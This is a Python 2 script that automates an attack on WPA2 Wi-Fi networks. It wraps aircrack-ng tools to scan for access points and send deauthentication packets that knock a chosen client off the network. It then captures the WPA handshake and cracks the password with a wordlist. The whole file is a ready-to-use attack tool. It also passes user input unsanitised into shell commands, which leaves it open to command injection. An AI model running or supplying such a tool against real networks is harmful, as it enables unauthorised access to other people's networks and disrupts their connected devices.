# -*- coding: UTF-8 -*-
import os
import signal
from subprocess import Popen

def main():
	
	os.system("sleep 1")
	print("\nShowing all network interfaces:\n")
	os.system("iwconfig")
	interface = raw_input("\nWhat is your wireless interface? (wlan0, eth0, etc.)\n")

	print("\nDiscovering nearby access points:\n")
	os.system("airodump-ng %s --enc WPA2" %interface)

	mac = raw_input("\nEnter MAC address of WPA Access Point\n")
	channel = raw_input("\nEnter channel of WPA Access Point\n")

	print("\nDiscovering devices connected to network:\n")
	os.system("airodump-ng %s --bssid %s -c %s" %(interface, mac, channel))

	mac_device = raw_input("\nEnter MAC address of client device connected to network\n")

	print("\nCapturing WPA handshake - please wait until deAuth packets have finished sending:\n")
	procs = [ Popen("airodump-ng --bssid %s -w handshakecap -c %s %s" %(mac, channel, interface), shell=True, preexec_fn=os.setsid), Popen("aireplay-ng -0 10 -a %s -c %s %s" %(mac, mac_device, interface), shell=True, preexec_fn=os.setsid)]
	for p in procs:
		try:
    			p.wait()
		except KeyboardInterrupt:
    			try:
				print("\nReturning to main process...\n")
       				os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    			except OSError:
       				pass
	
	os.system("sleep 1")
	print("\nCracking WPA2 password:\n")
	os.system("aircrack-ng -w /usr/share/john/password.lst -b %s handshakecap-01.cap" %mac)
	return

if __name__ == "__main__":
	main()
